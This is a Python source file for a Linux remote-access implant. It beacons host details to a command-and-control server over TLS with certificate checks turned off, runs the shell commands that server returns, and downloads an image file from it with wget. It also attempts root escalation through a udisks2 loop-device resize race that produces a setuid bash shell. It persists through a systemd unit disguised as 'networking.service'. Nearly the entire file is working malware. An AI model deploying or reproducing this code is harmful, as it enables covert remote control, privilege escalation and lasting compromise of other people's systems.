import socket
import json
import platform
import getpass
import uuid
import time
import os
import subprocess
import sys
import ssl
import re
import glob

C2_IP = IP_HOST # Adapt according to your network
C2_PORT = 9999
AGENT_ID_FILE = "/tmp/.conf-C0"  # File to retain the same ID between sessions

def get_python_version():
    return sys.version.split()[0]

def get_agent_id():
    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, "r") as f:
            return f.read().strip()
    new_id = str(uuid.uuid4())
    with open(AGENT_ID_FILE, "w") as f:
        f.write(new_id)
    return new_id

def get_ip_address():
    try:
        # Try to connect externally to retrieve the actual local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def get_linux_distribution():
    try:
        return subprocess.check_output("lsb_release -d", shell=True).decode().split(":")[1].strip()
    except:
        return platform.platform()

def get_system_info():
    return {
        "id": get_agent_id(),
        "hostname": socket.gethostname(),
        "ip": get_ip_address(),
        "os": get_linux_distribution(),
        "user": getpass.getuser(),
        "python-version" : get_python_version()
    }

def send_to_c2():
    data = get_system_info()
    context = ssl.create_default_context()
    # Ignore verification if it’s a self-signed certificate
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    try:
        with socket.create_connection((C2_IP, C2_PORT)) as sock:
            with context.wrap_socket(sock, server_hostname=C2_IP) as ssock:
                ssock.sendall(json.dumps(data).encode())

                # Waiting for command
                response = ssock.recv(4096).decode()
                if response:
                    res_data = json.loads(response)
                    command = res_data.get("command")
                    if command:
                        result = subprocess.getoutput(command)

                        # New connection to send the result
                        time.sleep(1)
                        with socket.create_connection((C2_IP, C2_PORT)) as result_sock:
                            with context.wrap_socket(result_sock, server_hostname=C2_IP) as ssl_result_sock:
                                result_payload = {
                                    "id": data["id"],
                                    "result": result
                                }
                                ssl_result_sock.sendall(json.dumps(result_payload).encode())

                                # Optional: read server response (avoid broken pipe)
                                try:
                                    ssl_result_sock.settimeout(2)
                                    server_ack = ssl_result_sock.recv(1024).decode()
                                except socket.timeout:
                                    pass
    except Exception as e:
        pass

def run_command(cmd, shell=False, capture_output=True):
    print(f"[*] Running: {cmd}")
    result = subprocess.run(cmd, shell=shell, text=True,
                            stdout=subprocess.PIPE if capture_output else None,
                            stderr=subprocess.STDOUT)
    output = result.stdout.strip() if result.stdout else ''
    if output:
        print(f"[+] Output:\n{output}\n")
    return output

def try_escalation():
    # 1. Kill gvfs monitor
    user = run_command(["whoami"], shell=True)

    run_command(["killall", "-KILL", "gvfs-udisks2-volume-monitor"])

    # 2. Set up loop device with udisksctl
    udisks_output = run_command("udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction", shell=True)

    # Extract loop device name (e.g. loop2)
    match = re.search(r'/dev/(loop\d+)', udisks_output)
    if not match:
        print("[-] Failed to find loop device.")
        return False

    loopdev = match.group(1)
    print(f"[+] Loop device detected: {loopdev}")

    # 3. Start background watcher using `sh`
    watcher_command = (
        "while true; do "
        "/tmp/blockdev*/bash -c 'sleep 3; ls -l /tmp/blockdev*/bash' && break; "
        "done 2>/dev/null"
    )
    process = subprocess.Popen(watcher_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 4. Run gdbus call with dynamic loop device
    gdbus_cmd = [
        "gdbus", "call", "--system",
        "--dest", "org.freedesktop.UDisks2",
        "--object-path", f"/org/freedesktop/UDisks2/block_devices/{loopdev}",
        "--method", "org.freedesktop.UDisks2.Filesystem.Resize", "0", "{}"
    ]
    run_command(gdbus_cmd)
    process.wait()
    bash = glob.glob("/tmp/blockdev*/bash")
    subprocess.run([bash[0], "-p", "-c", "cp /home/{}/.config/setup.py /root/.config/setup.py && python3 /root/.config/setup.py".format(user)])
    return True

def make_permanent():
    print("[*] Making the agent persistent...")
    if (os.geteuid() != 0):
        if (try_escalation() == True):
            exit(0)
        else:
            #os.system('crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 ~/.config/setup.py" | crontab -')
            print("[!] Failed to escalate privileges. Please run as root.")
            exit(0)
    else:
        print("[!] Running as root, setting up systemd service...")
        if os.path.exists("/etc/systemd/system/networking.service"):
            return
        # start /root/.config/setup.py on boot on systemd
        service_content = f"""[Unit]
Description=Networking Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 /root/.config/setup.py
Restart=always
[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/networking.service"
        with open(service_path, "w") as f:
            f.write(service_content)
        subprocess.run(["systemctl", "enable", "networking.service"])
        subprocess.run(["systemctl", "start", "networking.service"])
        exit(0)

if __name__ == "__main__":
    # pull from the C2_IP variable a file named xfs.image (it is a python server) try until you download it    
    if not os.path.exists("/tmp/xfs.image"):
        print("[*] Downloading xfs.image from C2...")
        while not os.path.exists("/tmp/xfs.image"):
            try:
                subprocess.run(["wget", f"http://{C2_IP}:8000/xfs.image", "-O", "/tmp/xfs.image"])
            except subprocess.CalledProcessError as e:
                print(f"[!] Failed to download xfs.image: {e}")
                time.sleep(5)
    make_permanent()
    while True:
        send_to_c2()
        time.sleep(3) 
